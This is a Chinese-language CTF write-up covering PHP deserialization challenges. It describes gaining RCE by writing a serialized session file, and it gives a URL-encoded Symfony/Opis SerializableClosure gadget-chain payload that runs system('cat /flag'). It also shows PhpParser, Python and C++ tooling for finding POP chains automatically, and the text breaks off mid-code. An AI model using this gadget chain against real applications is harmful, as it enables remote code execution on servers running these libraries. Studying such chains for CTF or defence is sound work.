<p>其实这条链本地没有打通，原因是因为在<code>UnicodeString.php</code>里，对<code>$this-&gt;string</code>进行了限制<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!\is_string(<span class="keyword">$this</span>-&gt;string)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;Cannot unserialize &#x27;</span>.<span class="keyword">__CLASS__</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        normalizer_is_normalized(<span class="keyword">$this</span>-&gt;string) ?: <span class="keyword">$this</span>-&gt;string = normalizer_normalize(<span class="keyword">$this</span>-&gt;string);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这个先不是担心的点，现在问题是反序列化点在哪，phpinfo条件没用上，哪里能反序列化呢？</p>
<p><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p>
<p>后来因为我们tmp目录任意文件写，可以直接写进session文件。查看phpinfo发现session 的处理器是php，于是可以把<code>upload_path|$serialize</code>写进<code>/tmp/sess_or4nge</code>，然后改自己的<code>session_id</code>为or4nge，即可触发反序列化。</p>
<p>那个__wakeup防了一处怎么办呢？猜到出题人以前发布在安全客的，万一远程能通呢，直接盲打过去，居然RCE成功了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">or4nge|O%3A38%3A%22Symfony%5CComponent%5CString%5CUnicodeString%<span class="number">22</span>%3A1%3A%7Bs%3A9%3A%<span class="number">22</span>%<span class="number">00</span>%2A%00string%<span class="number">22</span>%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%<span class="number">22</span>%3A1%3A%7Bs%3A42%3A%<span class="number">22</span>%00Symfony%5CComponent%5CString%5CLazyString%00value%<span class="number">22</span>%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%<span class="number">22</span>%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%<span class="number">22</span>%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%<span class="number">22</span>%3Bs%3A32%3A%22function%<span class="number">28</span>%<span class="number">29</span>%7Bsystem%<span class="number">28</span>%22cat+%2Fflag%<span class="number">22</span>%<span class="number">29</span>%3B%7D%<span class="number">22</span>%3Bs%3A5%3A%22scope%<span class="number">22</span>%3Bs%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%<span class="number">22</span>%3Bs%3A4%3A%22this%<span class="number">22</span>%3BN%3Bs%3A4%3A%22self%<span class="number">22</span>%3Bs%3A32%3A%2200000000034bf950000000005225a861%<span class="number">22</span>%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
<h3 id="Upload-it-2"><a href="#Upload-it-2" class="headerlink" title="Upload it 2(*)"></a>Upload it 2(*)</h3><p>属于是看了exp后想砸桌子的题。</p>
<p>两道题唯一的区别就是closure没了，改成了一个自己写的类，看起来很好利用，但是没想到在<strong>wakeup处被偷袭了一手，直接抛异常了。于是我们就想方设法去绕过`</strong>wakeup`，无果，直接开摆。</p>
<p>看完题解后发现poc和我写的完全一样，人家触发反序列化的时候走的不是weakup，是sleep。其实上一题题目的flag也说了是一个sleep_chain，但当时我没注意，pill0w说有么有可能是触发sleep，但我觉得这也太反人类了，为什么在反序列化的时候会触发序列化呢？？</p>
<p>看了官方wp也没说为什么会触发，我也不懂，但是这次收获了一个惨痛的教训，以后无论如何，先要盲打远程。</p>
<h3 id="FUMO-on-the-Christmas-tree"><a href="#FUMO-on-the-Christmas-tree" class="headerlink" title="FUMO on the Christmas tree"></a>FUMO on the Christmas tree</h3><p>强网杯pop_master魔改的题，记得当时正好还在考六级，那道题用的最暴力的做法，正则提取类的名字，属性，变量什么的，正则写的巨恶心，导致污点没法分析，然后我暴力dfs跑出一堆链，其中这些链99.9%都是被污染过的，但没办法，于是对这几百个链暴力建pop链暴力本地跑看能不能rce，我记得跑了一个多小时才行，总之就特别特别离谱。</p>
<p>时隔六月，碰到了一个更加阴间的题目，做法肯定要变了，参考了强网杯的题解，我们的方法之所以恶心，就是因为正则，如果我们能针对这份静态代码构建语法树，就能缕清整个代码逻辑了，然后想要什么就能拿什么了，污点分析也能顺便处理了。</p>
<p>这里就用到了PhpParser神奇的东西，能自动分析，下面我们就来学习一下怎么分析语法树拿下来的结果吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$stmts</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$class_point</span>) &#123;</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$class_point</span>-&gt;stmts <span class="keyword">as</span> <span class="variable">$kk</span> =&gt; <span class="variable">$subpoint</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$subpoint</span>-&gt;params) &#123;</span><br><span class="line">         <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$parms</span> = <span class="variable">$subpoint</span>-&gt;params[<span class="number">0</span>]-&gt;var-&gt;name;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$subpoint</span>-&gt;stmts <span class="keyword">as</span> <span class="variable">$kkk</span> =&gt; <span class="variable">$method_point</span>) &#123;</span><br><span class="line">      </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中第一层的<code>$class_point</code>的形如：<code>$class_point</code>里有<code>name</code>,<code>stmts</code>,<code>attrGroups</code>.</p>
<p><code>$class_point-&gt;name-&gt;name</code>可以获得每个类的名字<br>针对<code>stmts</code>进行遍历，能得到类内部的资料：注释里的方法都是通过<code>$subpoint-&gt;gettype()</code>得到的）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Titanic</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$people</span>;<span class="comment">//Stmt_Property</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ship</span>;<span class="comment">//Stmt_Property</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//Stmt_ClassMethod</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;people-&gt;action=<span class="keyword">$this</span>-&gt;ship;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们打印一下<code>$subpoint-&gt;name</code>,发现针对<code>Stmt_Property</code>都是NULL，如果是<code>Stmt_ClassMethod</code>就是函数的名称，通过<code>$subpoint-&gt;name-&gt;name</code>获得。<br>下面我开始分析每个函数内部的结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="variable">$subpoint</span>-&gt;name-&gt;name);</span><br><span class="line">var_dump(<span class="variable">$subpoint</span>-&gt;params[<span class="number">0</span>]-&gt;var-&gt;name);</span><br></pre></td></tr></table></figure>
<p>拿到每个函数的名字以及参数，因为这个题基本每个函数都是一个参数，有几个特例：</p>
<ul>
<li>__destruct 那个是入口点</li>
<li>__call 昨天已验证可以改写成一个参数</li>
<li>__invoke 只有一个参数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$subpoint</span>-&gt;stmts <span class="keyword">as</span> <span class="variable">$kkk</span> =&gt; <span class="variable">$method_point</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这样分析函数内部所有语句，还是分为这几类：<code>Stmt_If</code>，<code>Stmt_Expression</code>，没有<code>for</code>，那我就挨个分析每种语句了。</li>
<li><code>Stmt_Expression</code>：<br>赋值的变量名</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;expr-&gt;expr-&gt;var-&gt;name</span><br></pre></td></tr></table></figure>
<p>赋值的函数名：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;expr-&gt;expr-&gt;expr-&gt;name-&gt;parts[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><br>赋值函数参数:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;expr-&gt;expr-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name</span><br></pre></td></tr></table></figure><br>还需要考虑这种特殊情况：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$oEFgIl4</span> = <span class="variable">$oEFgIl4</span>;</span><br></pre></td></tr></table></figure><br>这种情况，赋值的东西就是：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;expr-&gt;expr-&gt;expr-&gt;name</span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>Stmt_If</code>：<br>一般<code>Stmt_If</code>只有一个语句，我们拿<code>stmts</code>的[0]即可。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;stmts[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>然后我们分析这种类似的语句：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;PKnKwkRo-&gt;rUC0bOsf(<span class="variable">$l3VwfSUx9Y</span>);</span><br></pre></td></tr></table></figure><br>他进行了一个递归处理：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">$this</span>-&gt;PKnKwkRo)-&gt;rUC0bOsf(<span class="variable">$l3VwfSUx9Y</span>);</span><br></pre></td></tr></table></figure><br>前面的括号可以用这种表示：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;stmts[<span class="number">0</span>]-&gt;expr-&gt;expr-&gt;var</span><br></pre></td></tr></table></figure><br>拿到<code>this</code>:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;stmts[<span class="number">0</span>]-&gt;expr-&gt;expr-&gt;var-&gt;var-&gt;name</span><br></pre></td></tr></table></figure><br>拿到this后用的对象：<code>PKnKwkRo</code><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;stmts[<span class="number">0</span>]-&gt;expr-&gt;expr-&gt;var-&gt;name-&gt;name</span><br></pre></td></tr></table></figure><br>括号后面的方法名称：<code>rUC0bOsf</code><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method_point</span>-&gt;stmts[<span class="number">0</span>]-&gt;expr-&gt;expr-&gt;name-&gt;name</span><br></pre></td></tr></table></figure></p>
<p>语法树解析完毕，</p>
<p>然后我们需要把<code>__call</code>,<code>__invoke</code>给处理了，我第一直觉是要解决通配符，但是仔细分析发现想复杂了，这其实就是一种正常的边换了一种形式而已。</p>
<p>最后是污点分析，我们拿到了所有方法汇总：</p>
<p>strrev，base64_decode，base64_encode，sha1，str_rot13，ucfirst，md5，crypt</p>
<p>对于md5,crypt,sha1这种单向函数是不可逆向的，直接pass掉，然后在debug过程中发现ucfirst和base64_encode也会让事情变得更复杂，也不要他们。</p>
<p>然后就开始了无脑的码农时间。。。</p>
<p>首先是对<code>__invoke</code>和<code>__call</code>的魔术方法的类进行改写，全部能改写为正常的形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">erase_call</span>(<span class="params">FILEIN, FILEOUT</span>):</span></span><br><span class="line">    fp = <span class="built_in">open</span>(FILEIN, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    fo = <span class="built_in">open</span>(FILEOUT, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    FILE = [_.decode().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> fp.readlines()]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(FILE):</span><br><span class="line">        line = FILE[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;__call&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">            l1, l2 = FILE[i + <span class="number">1</span>], FILE[i + <span class="number">2</span>]</span><br><span class="line">            use_func = re.search(<span class="string">r&#x27;extract\(\[\$name =&gt; \&#x27;(.*)\&#x27;\]\);&#x27;</span>, l1)[<span class="number">1</span>]</span><br><span class="line">            pattern = re.search(<span class="string">r&#x27;if \(is\_callable\(\[\$this\-\&gt;(.*)\, \$(.*)\]\)\)&#x27;</span>, l2)</span><br><span class="line">            obj_name, func_name = pattern[<span class="number">1</span>], pattern[<span class="number">2</span>] </span><br><span class="line">            new_code = []</span><br><span class="line">            new_code.append(<span class="string">&#x27;    public function %s($value) &#123;\n&#x27;</span> % func_name)</span><br><span class="line">            new_code.append(<span class="string">&#x27;        if (is_callable([$this-&gt;%s, %s])) @$this-&gt;%s-&gt;%s($value);\n&#x27;</span> % (obj_name, use_func, obj_name, use_func))</span><br><span class="line">            new_code.append(<span class="string">&#x27;    &#125;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> new_code:</span><br><span class="line">                fo.write(j.encode())</span><br><span class="line">            i += <span class="number">4</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fo.write((line + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    fp.close()        </span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">erase_invoke</span>(<span class="params">FILEIN, FILEOUT</span>):</span></span><br><span class="line">    fp = <span class="built_in">open</span>(FILEIN, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    fo = <span class="built_in">open</span>(FILEOUT, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    FILE = [_.decode().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> fp.readlines()]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(FILE):</span><br><span class="line">        line = FILE[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;@call_user_func&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">            pattern = re.search(<span class="string">r&#x27;call_user_func\(\$this\-\&gt;(.*)\, \[\&#x27;(.*)\&#x27; \=\&gt; \$(.*)\]\);&#x27;</span>, line)</span><br><span class="line">            <span class="comment"># print(pattern)</span></span><br><span class="line">            obj_name, use_func, func_para = pattern[<span class="number">1</span>], pattern[<span class="number">2</span>], pattern[<span class="number">3</span>]</span><br><span class="line">            <span class="comment"># print(obj_name, use_func, func_para)</span></span><br><span class="line">            new_code = <span class="string">&quot;        if (is_callable([$this-&gt;%s, &#x27;%s&#x27;])) @$this-&gt;%s-&gt;%s(%s);\n&quot;</span> % (obj_name, use_func, obj_name, use_func, func_para)</span><br><span class="line">            fo.write(new_code.encode())</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;__invoke&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            l1, l2 = FILE[i + <span class="number">1</span>], FILE[i + <span class="number">2</span>]</span><br><span class="line">            key = re.search(<span class="string">r&#x27;\$key = base64_decode\(\&#x27;(.*)\&#x27;\);&#x27;</span>, l1)[<span class="number">1</span>]</span><br><span class="line">            key = b64decode(key.encode()).decode()</span><br><span class="line">            pattern = re.search(<span class="string">r&#x27;\$this\-\&gt;(.*)\-\&gt;(.*)\(\$value\[\$key\]\);&#x27;</span>, l2)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                obj_name, use_func = pattern[<span class="number">1</span>], pattern[<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(line)</span><br><span class="line">                <span class="built_in">print</span>(l1)</span><br><span class="line">                <span class="built_in">print</span>(l2)</span><br><span class="line">            new_code = []</span><br><span class="line">            new_code.append(<span class="string">&#x27;    public function %s($value) &#123;\n&#x27;</span> % key)</span><br><span class="line">            new_code.append(<span class="string">&#x27;        if (is_callable([$this-&gt;%s, %s])) @$this-&gt;%s-&gt;%s($value);\n&#x27;</span> % (obj_name, use_func, obj_name, use_func))</span><br><span class="line">            new_code.append(<span class="string">&#x27;    &#125;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> new_code:</span><br><span class="line">                fo.write(j.encode())</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fo.write((line + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    fp.close()        </span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line">erase_invoke(<span class="string">&#x27;class.code.txt&#x27;</span>, <span class="string">&#x27;mid_class.txt&#x27;</span>)</span><br><span class="line">erase_call(<span class="string">&#x27;mid_class.txt&#x27;</span>, <span class="string">&#x27;final_class.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>在最终代码里手动把<code>namespace christmasTree</code>里去掉，之后进行PHP_Parser对这份代码进行语法树构建分析：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;memory_limit&#x27;</span>, <span class="string">&#x27;1024M&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;C:\Users\FYHSSGSS\vendor\autoload.php&#x27;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>; <span class="comment">//use to catch error</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>; <span class="comment">//use to read node</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>; <span class="comment">//use to anlaysis code</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$inputPhpFile</span> = <span class="string">&#x27;final_class.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = file_get_contents(<span class="variable">$inputPhpFile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$stmts</span> = <span class="variable">$parser</span>-&gt;parse(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Parse error:<span class="subst">&#123;$e-&gt;getMessage()&#125;</span>\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[+] get file done\n&quot;</span>;</span><br><span class="line"><span class="variable">$deleteCnt</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$deleteCla</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$nodeDumper</span> = <span class="keyword">new</span> NodeDumper;</span><br><span class="line"><span class="variable">$class_num</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$func_list</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&quot;function_list.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="variable">$fo</span> = fopen(<span class="string">&quot;deploy_list.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="variable">$fd</span> = fopen(<span class="string">&quot;destination.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$stmts</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$class_point</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$class_point</span>-&gt;gettype() === <span class="string">&#x27;Stmt_Nop&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$class_point</span>-&gt;gettype() === <span class="string">&#x27;Stmt_Class&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$class_name</span> = <span class="variable">$class_point</span>-&gt;name-&gt;name;</span><br><span class="line">        <span class="variable">$class_num</span>++;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$class_point</span>-&gt;stmts <span class="keyword">as</span> <span class="variable">$kk</span> =&gt; <span class="variable">$subpoint</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$subpoint</span>-&gt;gettype() === <span class="string">&#x27;Stmt_Nop&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$subpoint</span>-&gt;gettype() === <span class="string">&#x27;Stmt_Property&#x27;</span>) &#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$subpoint</span>-&gt;gettype() === <span class="string">&quot;Stmt_ClassMethod&quot;</span>) &#123;</span><br><span class="line">                <span class="variable">$func_name</span> = <span class="variable">$subpoint</span>-&gt;name-&gt;name;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$func_name</span> === <span class="string">&#x27;__destruct&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$entrance</span> = <span class="variable">$class_name</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">               <span class="keyword">if</span> (!<span class="variable">$subpoint</span>-&gt;params) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$parms</span> = <span class="variable">$subpoint</span>-&gt;params[<span class="number">0</span>]-&gt;var-&gt;name;</span><br><span class="line">                fwrite(<span class="variable">$fp</span>, <span class="variable">$class_name</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$func_name</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="variable">$pass_way</span> = <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$subpoint</span>-&gt;stmts <span class="keyword">as</span> <span class="variable">$kkk</span> =&gt; <span class="variable">$method_point</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$method_point</span>-&gt;gettype() === <span class="string">&#x27;Stmt_Expression&#x27;</span>) &#123;</span><br><span class="line">                        <span class="variable">$assign_1</span> = <span class="variable">$method_point</span>-&gt;expr-&gt;expr-&gt;var-&gt;name;</span><br><span class="line">                        <span class="variable">$use_func</span> = <span class="variable">$method_point</span>-&gt;expr-&gt;expr-&gt;expr-&gt;name-&gt;parts[<span class="number">0</span>];</span><br><span class="line">                        <span class="variable">$assign_2</span> = <span class="variable">$method_point</span>-&gt;expr-&gt;expr-&gt;expr-&gt;args[<span class="number">0</span>]-&gt;value-&gt;name;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$use_func</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="variable">$assign_2</span> = <span class="variable">$method_point</span>-&gt;expr-&gt;expr-&gt;expr-&gt;name;</span><br><span class="line">                            <span class="variable">$use_func</span> = <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable">$func_list</span>[<span class="variable">$use_func</span>] = <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$assign_1</span> !== <span class="variable">$assign_2</span>) <span class="keyword">break</span>;</span><br><span class="line">                        <span class="variable">$pass_way</span> = <span class="variable">$use_func</span>;</span><br><span class="line">                        <span class="keyword">if</span>(in_array(<span class="variable">$pass_way</span>, <span class="keyword">array</span>(<span class="string">&quot;sha1&quot;</span>, <span class="string">&quot;md5&quot;</span>, <span class="string">&quot;crypt&quot;</span>))) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$method_point</span>-&gt;gettype() === <span class="string">&#x27;Stmt_If&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$method_point</span>-&gt;stmts[<span class="number">0</span>]-&gt;expr-&gt;name-&gt;parts[<span class="number">0</span>] == <span class="string">&quot;readfile&quot;</span>) &#123;</span><br><span class="line">                            fwrite(<span class="variable">$fd</span>, <span class="variable">$class_name</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$func_name</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$parms</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$use_obj</span> = <span class="variable">$method_point</span>-&gt;stmts[<span class="number">0</span>]-&gt;expr-&gt;expr-&gt;var-&gt;name-&gt;name;</span><br><span class="line">                        <span class="variable">$use_func</span> = <span class="variable">$method_point</span>-&gt;stmts[<span class="number">0</span>]-&gt;expr-&gt;expr-&gt;name-&gt;name;</span><br><span class="line">                        fwrite(<span class="variable">$fo</span>, <span class="variable">$class_name</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$func_name</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$use_obj</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$use_func</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$pass_way</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[+] filter done&#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$entrance</span>;</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line">fclose(<span class="variable">$fo</span>);</span><br></pre></td></tr></table></figure><br>构建把所有类的名称，函数， 终点的类的函数，以及函数调用关系分别存储起来。<br>其中有一些污点过滤，比如md5,sha1,ucfirst,crypt的调用直接无视，赋值两边参数不等的也直接无视，另外发现base64解码的时候出现的不可见字符也会对后面产生影响，故把所有进行<code>base64_decode</code>部分全部剪掉。</p>
<p>然后手动加一下<code>__destruct</code>在文件里，把这三个文件放在一起，然后用C语言寻找可行链。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem(a, b) memset(a, b, sizeof(a))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;string, string&gt; PII;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Y second</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">0</span>, f = <span class="number">1</span>; <span class="keyword">char</span> c = <span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">isdigit</span>(c)) &#123;<span class="keyword">if</span> (c == <span class="string">&#x27;-&#x27;</span>)f = <span class="number">-1</span>; c = <span class="built_in">getchar</span>();&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">isdigit</span>(c)) &#123;x = x * <span class="number">10</span>+ c-<span class="string">&#x27;0&#x27;</span>; c = <span class="built_in">getchar</span>();&#125;</span><br><span class="line">	<span class="keyword">return</span> x * f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">20010</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> u, v, next;</span><br><span class="line">	PII w;</span><br><span class="line">	<span class="built_in">Edge</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">Edge</span>(<span class="keyword">int</span> _1, <span class="keyword">int</span> _2, <span class="keyword">int</span> _3, string _4, string _5): <span class="built_in">u</span>(_1), <span class="built_in">v</span>(_2), <span class="built_in">next</span>(_3) &#123;</span><br><span class="line">		w = <span 